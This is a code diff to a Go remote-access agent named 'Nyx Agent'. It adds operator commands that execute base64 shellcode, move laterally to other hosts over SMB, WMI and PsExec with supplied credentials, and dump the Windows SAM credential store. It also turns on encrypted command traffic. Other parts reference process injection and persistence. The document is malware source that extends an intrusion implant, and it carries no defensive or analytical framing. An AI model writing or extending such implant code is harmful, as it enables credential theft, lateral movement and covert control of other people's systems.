@@ -376,6 +376,43 @@ func dispatch(command string) (string, string) {
 		}
 		return out, "completed"
 
+	case "shellcode":
+		if arg == "" {
+			return "usage: shellcode <base64_shellcode>", "failed"
+		}
+		return shellcodeRun(arg)
+
+	case "smb-exec":
+		// usage: smb-exec <host> <user> <pass> <local_exe_path> [remote_path]
+		p := strings.SplitN(arg, " ", 5)
+		if len(p) < 4 {
+			return "usage: smb-exec <host> <user> <pass> <local_exe> [remote_path]", "failed"
+		}
+		remote := ""
+		if len(p) == 5 {
+			remote = p[4]
+		}
+		return smbExec(p[0], p[1], p[2], p[3], remote)
+
+	case "wmi-exec":
+		// usage: wmi-exec <host> <user> <pass> <command>
+		p := strings.SplitN(arg, " ", 4)
+		if len(p) < 4 {
+			return "usage: wmi-exec <host> <user> <pass> <command>", "failed"
+		}
+		return wmiExec(p[0], p[1], p[2], p[3])
+
+	case "psexec":
+		// usage: psexec <host> <user> <pass> <command>
+		p := strings.SplitN(arg, " ", 4)
+		if len(p) < 4 {
+			return "usage: psexec <host> <user> <pass> <command>", "failed"
+		}
+		return psExec(p[0], p[1], p[2], p[3])
+
+	case "dump-sam":
+		return dumpSAM()
+
 	case "inject":
 		// usage: inject <pid> <shellcode_base64>
 		injParts := strings.SplitN(arg, " ", 2)
@@ -557,7 +594,12 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v0.3.0 starting...")
+	fmt.Println("[*] Nyx Agent v0.5.0 starting...")
+	if err := initCrypto(); err != nil {
+		fmt.Printf("[!] Crypto init warning: %v\n", err)
+	} else if EncKey != "" {
+		fmt.Println("[+] AES-256-GCM traffic encryption active")
+	}
 
 	var agentID string
 	var dohStarted bool
